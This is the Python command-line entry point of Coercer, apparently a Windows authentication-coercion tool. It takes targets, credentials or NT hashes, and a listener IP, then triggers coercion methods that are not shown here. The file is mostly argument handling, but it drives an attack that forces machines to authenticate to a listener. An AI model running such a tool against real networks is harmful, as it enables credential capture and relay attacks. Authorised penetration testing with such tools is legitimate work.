#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : __main__.py
# Author             : Podalirius (@podalirius_)
# Date created       : 17 Sep 2022


import argparse
import os
import sys

from coercer.core.Reporter import Reporter
from coercer.structures.Credentials import Credentials
from coercer.core.modes.coerce import action_coerce
from coercer.core.loader import find_and_load_coerce_methods
from coercer.network.smb import try_login


VERSION = "2.4.1-blackhat-edition"


def parseArgs():
    parser = argparse.ArgumentParser(add_help=True, description="Automatic windows authentication coercer using "
                                                                "various methods.")
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose mode (default: False)")

    mode_coerce = argparse.ArgumentParser(add_help=False)
    mode_coerce.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose mode (default: False)")
    # Advanced configuration
    mode_coerce_advanced_config = mode_coerce.add_argument_group("Advanced configuration")
    mode_coerce_advanced_config.add_argument("--export-json", default=None, type=str, help="Export results to s"
                                                                                           "pecified JSON file.")
    mode_coerce_advanced_config.add_argument("--delay", default=None, type=int,
                                             help="Delay between attempts (in seconds)")
    mode_coerce_advanced_config.add_argument("--http-port", default=80, type=int, help="HTTP port (default: 80)")
    mode_coerce_advanced_config.add_argument("--smb-port", default=445, type=int, help="SMB port (default: 445)")
    mode_coerce_advanced_config.add_argument("--always-continue", default=False, action="store_true",
                                             help="Always continue to coerce")
    mode_coerce_advanced_config.add_argument("--auth-type", default=None, type=str,
                                             help="Desired authentication type ('smb' or 'http').")
    # Filters
    mode_coerce_filters = mode_coerce.add_argument_group("Filtering")
    mode_coerce_filters.add_argument("--filter-method-name", default=[], action='append', type=str, help="")
    mode_coerce_filters.add_argument("--filter-protocol-name", default=[], action='append', type=str, help="")
    mode_coerce_filters.add_argument("--filter-pipe-name", default=[], action='append', type=str, help="")
    # Credentials
    mode_coerce_credentials = mode_coerce.add_argument_group("Credentials")
    mode_coerce_credentials.add_argument("-u", "--username", default="",
                                         help="Username to authenticate to the machine.")
    mode_coerce_credentials.add_argument("-p", "--password", default="",
                                         help="Password to authenticate to the machine. "
                                              "(if omitted, it will be asked unless -no-pass is specified)")
    mode_coerce_credentials.add_argument("-d", "--domain", default="",
                                         help="Windows domain name to authenticate to the machine.")
    mode_coerce_credentials.add_argument("--hashes", action="store", metavar="[LMHASH]:NTHASH",
                                         help="NT/LM hashes (LM hash can be empty)")
    mode_coerce_credentials.add_argument("--no-pass", action="store_true",
                                         help="Don't ask for password (useful for -k)")
    mode_coerce_credentials.add_argument("--dc-ip", action="store", metavar="ip address",
                                         help="IP Address of the domain controller. If omitted it will use the "
                                              "domain part (FQDN) specified in the target parameter")
    # Targets source
    mode_coerce_targets_source = mode_coerce.add_mutually_exclusive_group(required=True)
    mode_coerce_targets_source.add_argument("-t", "--target-ip", default=None,
                                            help="IP address or hostname of the target machine")
    mode_coerce_targets_source.add_argument("-f", "--targets-file", default=None,
                                            help="File containing a list of IP address or hostname "
                                                 "of the target machines")
    # Listener
    listener_group = mode_coerce.add_argument_group("Listener")
    listener_group.add_argument("-l", "--c-ip", required=True, type=str,
                                help="IP address or hostname of the listener machine")
    # Scan
    scan_group = mode_coerce.add_argument_group("Scan")
    scan_group.add_argument("--scan", action="store_true", help="Scan mode")

    # Adding the subparsers to the base parser
    subparsers = parser.add_subparsers(help="Mode", dest="mode", required=True)
    mode_coerce_parser = subparsers.add_parser("coerce", parents=[mode_coerce], help="Trigger authentications t"
                                                                                     "hrough all known methods with "
                                                                                     "known working paths")

    options = parser.parse_args()

    # Parsing hashes
    lmhash, nthash = '', ''
    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
        from getpass import getpass
        options.password = getpass("Password:")

    return lmhash, nthash, options


def main():
    available_methods = find_and_load_coerce_methods()

    lmhash, nthash, options = parseArgs()

    reporter = Reporter(verbose=options.verbose, options=options)

    # Parsing targets
    targets = []
    if options.target_ip is not None:
        targets = [options.target_ip]
    elif options.targets_file is not None:
        if os.path.exists(options.targets_file):
            with open(options.targets_file, 'r') as f:
                targets = sorted(list(set([line.strip() for line in f.readlines()])))
        else:
            print(f"[!] Could not open targets file '{options.targets_file}'.")
            sys.exit(1)

    credentials = Credentials(username=options.username, password=options.password, domain=options.domain,
                              lmhash=lmhash, nthash=nthash)

    # Processing actions
    if options.mode == "coerce":
        for target in targets:
            # Checking credentials if any
            if try_login(credentials, target, verbose=options.verbose):
                # Starting action
                action_coerce(target, available_methods, options, credentials, reporter)
                # Reporting results
                if options.export_json is not None:
                    reporter.export_json(options.export_json)

    print("[+] All done! Bye Bye!")


if __name__ == '__main__':
    main()
